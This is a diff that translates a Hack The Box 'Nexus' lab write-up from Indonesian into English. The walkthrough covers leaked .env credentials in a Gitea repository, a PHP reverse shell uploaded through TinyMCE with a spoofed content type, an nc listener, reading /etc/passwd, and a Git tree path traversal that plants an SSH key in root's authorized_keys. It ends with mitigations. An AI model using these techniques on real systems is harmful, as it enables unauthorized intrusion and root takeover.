@@ -1,239 +1,294 @@
-# HackTheBox - Nexus Write-up
+# Hack The Box — Nexus Write-up
 
-  ## Ringkasan
+## Summary
 
-  Target `nexus.htb` menjalankan website utama Nexus Energy Authority. Dari enumerasi virtual host ditemukan subdomain
-  `git.nexus.htb` dan `billing.nexus.htb`. Repository publik di Gitea membocorkan konfigurasi aplikasi Krayin CRM,
-  termasuk database credential dan `APP_KEY`. Credential tersebut digunakan untuk login ke aplikasi billing.
+The target at `nexus.htb` hosted the main Nexus Energy Authority website. Virtual host enumeration identified the subdomains `git.nexus.htb` and `billing.nexus.htb`. A public Gitea repository exposed Krayin CRM application configuration, including database credentials and an `APP_KEY`. The discovered credentials were used to log in to the billing application.
 
-  Akses awal diperoleh melalui upload PHP reverse shell pada fitur upload TinyMCE di Krayin CRM. Shell berjalan sebagai
-  `www-data`. Dari sana ditemukan file environment aplikasi, lalu dilakukan pivot ke user `jones`.
+Initial access was obtained by uploading a PHP reverse shell through the TinyMCE upload feature in Krayin CRM. The shell ran as `www-data`. Application environment files were then found, allowing a pivot to the user `jones`.
 
-  Privilege escalation dilakukan dengan menyalahgunakan service `gitea-template-sync`, yang melakukan sinkronisasi
-  repository template. Dengan membuat Git tree berisi path traversal `../../../../root/.ssh/authorized_keys`, public key
-  attacker berhasil ditulis ke `/root/.ssh/authorized_keys`. Setelah itu SSH sebagai root berhasil dilakukan dan
-  `root.txt` didapatkan.
+Privilege escalation abused the `gitea-template-sync` service, which synchronized template repositories. A Git tree containing the traversal path `../../../../root/.ssh/authorized_keys` caused the service to write the attacker's public key to `/root/.ssh/authorized_keys`. SSH access as root was then obtained, followed by `root.txt`.
 
-  ## Informasi Target
+## Target Information
 
-  - Machine: Nexus
-  - Domain utama: `nexus.htb`
-  - Subdomain penting:
-    - `git.nexus.htb`
-    - `billing.nexus.htb`
-  - OS: Ubuntu 24.04.4 LTS
-  - Web stack:
-    - Nginx
-    - Gitea 1.26.0
-    - Krayin CRM
+- Machine: Nexus
+- Main domain: `nexus.htb`
+- Relevant subdomains:
+  - `git.nexus.htb`
+  - `billing.nexus.htb`
+- OS: Ubuntu 24.04.4 LTS
+- Web stack:
+  - Nginx
+  - Gitea 1.26.0
+  - Krayin CRM
 
-  ## Enumerasi
+## Enumeration
 
-  Website utama ditemukan pada:
+The main website was available at:
 
-  ```text
-  http://nexus.htb
+```text
+http://nexus.htb
+```
 
-  Pada halaman careers terdapat alamat email internal:
+The careers page contained an internal email address:
 
-  j.matthew@nexus.htb
+```text
+j.matthew@nexus.htb
+```
 
-  Enumerasi virtual host dilakukan dengan ffuf:
+Virtual host enumeration was performed with ffuf:
 
-  ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-    -u http://nexus.htb/ \
-    -H "Host: FUZZ.nexus.htb" \
-    -fw 4
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+  -u http://nexus.htb/ \
+  -H "Host: FUZZ.nexus.htb" \
+  -fw 4
+```
 
-  Hasil penting:
+Relevant results:
 
-  git       [Status: 200]
-  billing   [Status: 302]
+```text
+git       [Status: 200]
+billing   [Status: 302]
+```
 
-  Kemudian host ditambahkan ke /etc/hosts di Kali:
+The hosts were then added to `/etc/hosts` on Kali:
 
-  10.129.84.131 nexus.htb git.nexus.htb billing.nexus.htb
+```text
+10.129.84.131 nexus.htb git.nexus.htb billing.nexus.htb
+```
 
-  ## Gitea Enumeration
+## Gitea Enumeration
 
-  Pada git.nexus.htb, ditemukan repository publik:
+A public repository was found on `git.nexus.htb`:
 
-  admin/krayin-docker-setup
+```text
+admin/krayin-docker-setup
+```
 
-  Repository tersebut berisi file .env. Dari commit diff terlihat konfigurasi penting:
+The repository contained an `.env` file. A commit diff exposed important configuration values:
 
-  APP_URL=http://billing.nexus.htb
-  APP_DEBUG=true
+```text
+APP_URL=http://billing.nexus.htb
+APP_DEBUG=true
 
-  DB_CONNECTION=mysql
-  DB_HOST=127.0.0.1
-  DB_PORT=3306
-  DB_DATABASE=krayin
-  DB_USERNAME=krayin
-  DB_PASSWORD=y27xb3ha!!74GbR
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+```
 
-  Credential ini kemudian digunakan untuk akses ke aplikasi billing.
+These credentials were then used to access the billing application.
 
-  ## Initial Access
+## Initial Access
 
-  Aplikasi billing berjalan di:
+The billing application was available at:
 
-  http://billing.nexus.htb
+```text
+http://billing.nexus.htb
+```
 
-  Setelah login ke dashboard Krayin CRM, fitur upload TinyMCE dapat digunakan untuk mengunggah file PHP.
+After logging in to the Krayin CRM dashboard, the TinyMCE upload feature was used to upload a PHP file.
 
-  Request upload dimodifikasi melalui Burp Suite:
+The upload request was modified in Burp Suite:
 
-  Content-Disposition: form-data; name="file"; filename="php.reverse.shell.php"
-  Content-Type: image/png
+```http
+Content-Disposition: form-data; name="file"; filename="php.reverse.shell.php"
+Content-Type: image/png
+```
 
-  Isi file adalah PHP reverse shell. Server mengembalikan path upload:
+The file contained a PHP reverse shell. The server returned the upload path:
 
-  /storage/tinymce/<random>.php
+```text
+/storage/tinymce/<random>.php
+```
 
-  Listener disiapkan di Kali:
+A listener was prepared on Kali:
 
-  nc -lvnp 443
+```bash
+nc -lvnp 443
+```
 
-  Setelah file PHP diakses melalui browser, shell berhasil masuk:
+Opening the PHP file in the browser triggered a shell connection:
 
-  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-  Shell kemudian distabilkan:
+The shell was then stabilized:
 
-  python3 -c 'import pty; pty.spawn("/bin/bash")'
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-  ## Post Exploitation
+## Post-Exploitation
 
-  Dari shell www-data, file konfigurasi aplikasi ditemukan di direktori Krayin:
+From the `www-data` shell, the application configuration file was found in the Krayin directory:
 
-  cat .env
+```bash
+cat .env
+```
 
-  Isi penting:
+Relevant contents:
 
-  APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
-  APP_DEBUG=true
-  APP_URL=http://billing.nexus.htb
+```text
+APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
+APP_DEBUG=true
+APP_URL=http://billing.nexus.htb
 
-  DB_CONNECTION=mysql
-  DB_HOST=127.0.0.1
-  DB_PORT=3306
-  DB_DATABASE=krayin
-  DB_USERNAME=krayin
-  DB_PASSWORD=y27xb3ha!!74GbR
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+```
 
-  Enumerasi user lokal:
+Local users were enumerated:
 
-  cat /etc/passwd
+```bash
+cat /etc/passwd
+```
 
-  User menarik:
+Relevant users:
 
-  jones:x:1000:1000:/home/jones:/bin/bash
-  git:x:111:112:Git Version Control:/home/git:/bin/bash
+```text
+jones:x:1000:1000:/home/jones:/bin/bash
+git:x:111:112:Git Version Control:/home/git:/bin/bash
+```
 
-  Akses sebagai jones kemudian diperoleh menggunakan credential yang ditemukan.
+Access as `jones` was then obtained using the discovered credentials.
 
-  User flag berada di:
+The user flag was located at:
 
-  /home/jones/user.txt
+```text
+/home/jones/user.txt
+```
 
-  ## Privilege Escalation
+## Privilege Escalation
 
-  Enumerasi timer systemd menunjukkan service menarik:
+Systemd timer enumeration identified a relevant service:
 
-  systemctl list-timers
+```bash
+systemctl list-timers
+```
 
-  Ditemukan:
+The timer and service were:
 
-  gitea-template-sync.timer -> gitea-template-sync.service
+```text
+gitea-template-sync.timer -> gitea-template-sync.service
+```
 
-  Service ini melakukan sinkronisasi repository template dari Gitea. Repository target dibuat sebagai template
-  repository:
+The service synchronized template repositories from Gitea. The target repository was configured as a template repository:
 
-  jones/rce
+```text
+jones/rce
+```
 
-  Karena mesin target tidak memiliki mapping DNS untuk git.nexus.htb, Git dipaksa menggunakan host header/resolve lokal
-  saat clone atau push:
+Because the target machine had no DNS mapping for `git.nexus.htb`, Git was configured to use a host header or a local address override when cloning or pushing:
 
-  git -c http.extraHeader="Host:git.nexus.htb" \
-    clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1/jones/rce.git
+```bash
+git -c http.extraHeader="Host:git.nexus.htb" \
+  clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1/jones/rce.git
+```
 
-  Public/private key dibuat:
+A public/private key pair was generated:
 
-  ssh-keygen -t ed25519 -f /tmp/.k -N ''
+```bash
+ssh-keygen -t ed25519 -f /tmp/.k -N ''
+```
 
-  Kemudian dibuat Git object berisi path traversal menuju:
+A Git object was then constructed with the following traversal path:
 
-  ../../../../root/.ssh/authorized_keys
+```text
+../../../../root/.ssh/authorized_keys
+```
 
-  Tujuannya adalah agar service sync menulis public key attacker ke file authorized keys milik root.
+The objective was to make the synchronization service write the attacker's public key to root's authorized keys file.
 
-  Script build.py dijalankan dari dalam repository Git:
+The `build.py` script was run from inside the Git repository:
 
-  cd /tmp/rce
-  python3 /tmp/build.py
+```bash
+cd /tmp/rce
+python3 /tmp/build.py
+```
 
-  Setelah berhasil, commit object dibuat:
+The script successfully created a commit object:
 
-  Done: f0f50f4880b6bab00bee0cbda19d16933c258bc4
+```text
+Done: f0f50f4880b6bab00bee0cbda19d16933c258bc4
+```
 
-  Repository kemudian dipush:
+The repository was then pushed:
 
-  git remote set-url origin 'http://jones:y27xb3ha%21%2174GbR@git.nexus.htb/jones/rce.git'
+```bash
+git remote set-url origin 'http://jones:y27xb3ha%21%2174GbR@git.nexus.htb/jones/rce.git'
 
-  git -c http.curloptResolve=git.nexus.htb:80:127.0.0.1 \
-    push -u origin main --force
+git -c http.curloptResolve=git.nexus.htb:80:127.0.0.1 \
+  push -u origin main --force
+```
 
-  Push berhasil:
+The push succeeded:
 
-  [new branch] main -> main
-  branch 'main' set up to track 'origin/main'
+```text
+[new branch] main -> main
+branch 'main' set up to track 'origin/main'
+```
 
-  Setelah timer berjalan, public key berhasil ditulis ke /root/.ssh/authorized_keys.
+After the timer ran, the public key was written to `/root/.ssh/authorized_keys`.
 
-  ## Root Access
+## Root Access
 
-  SSH sebagai root dilakukan menggunakan private key yang dibuat sebelumnya:
+SSH access as root was obtained using the previously generated private key:
 
-  ssh -i /tmp/.k root@10.129.84.131
+```bash
+ssh -i /tmp/.k root@10.129.84.131
+```
 
-  Login berhasil:
+The login succeeded:
 
-  Welcome to Ubuntu 24.04.4 LTS
-  root@nexus:~#
+```text
+Welcome to Ubuntu 24.04.4 LTS
+root@nexus:~#
+```
 
-  Root flag dibaca dari:
+The root flag was read with:
 
-  cat /root/root.txt
+```bash
+cat /root/root.txt
+```
 
-  ## Rantai Eksploitasi
+## Exploitation Chain
 
-  Virtual host enumeration
-  -> git.nexus.htb ditemukan
-  -> repository admin/krayin-docker-setup membocorkan .env
-  -> credential digunakan login ke billing.nexus.htb
-  -> upload PHP reverse shell via TinyMCE
-  -> shell sebagai www-data
-  -> enumerasi local user dan konfigurasi
-  -> akses sebagai jones
-  -> abuse gitea-template-sync path traversal
-  -> tulis SSH public key ke /root/.ssh/authorized_keys
-  -> SSH sebagai root
-  -> root.txt
+```text
+Virtual host enumeration
+-> discover git.nexus.htb
+-> admin/krayin-docker-setup repository exposes .env
+-> use credentials to log in to billing.nexus.htb
+-> upload a PHP reverse shell through TinyMCE
+-> obtain a shell as www-data
+-> enumerate local users and application configuration
+-> obtain access as jones
+-> abuse gitea-template-sync path traversal
+-> write an SSH public key to /root/.ssh/authorized_keys
+-> log in as root over SSH
+-> root.txt
+```
 
-  ## Dampak
+## Impact
 
-  - Credential sensitif tersimpan di repository publik.
-  - File upload pada aplikasi billing mengizinkan eksekusi PHP.
-  - Service template sync tidak memvalidasi path traversal pada Git tree.
-  - Kombinasi celah ini memungkinkan remote attacker mendapatkan akses root.
+- Sensitive credentials were stored in a public repository.
+- File uploads in the billing application allowed PHP execution.
+- The template synchronization service did not validate traversal paths in Git trees.
+- These vulnerabilities together allowed a remote attacker to obtain root access.
 
-  ## Rekomendasi Mitigasi
+## Mitigation Recommendations
 
-  1. Jangan menyimpan .env, credential database, atau secret aplikasi di repository.
-  2. Rotasi seluruh credential yang pernah bocor.
-  3. Batasi upload file hanya ke tipe aman dan simpan di lokasi non-executable.
-  4. Nonaktifkan eksekusi PHP di direktori upload.
-  5. Validasi dan normalisasi path pada proses sinkronisasi template.
-  6. Jalankan service sync dengan user non-root dan permission minimum.
-  7. Tambahkan proteksi terhadap Git tree traversal seperti .. dan absolute path.
+1. Do not store `.env` files, database credentials, or application secrets in repositories.
+2. Rotate all credentials that have been exposed.
+3. Restrict uploads to safe file types and store them in a location where code cannot execute.
+4. Disable PHP execution in upload directories.
+5. Validate and normalize paths during template synchronization.
+6. Run the synchronization service as a non-root user with minimal permissions.
+7. Protect against Git tree traversal, including `..` components and absolute paths.
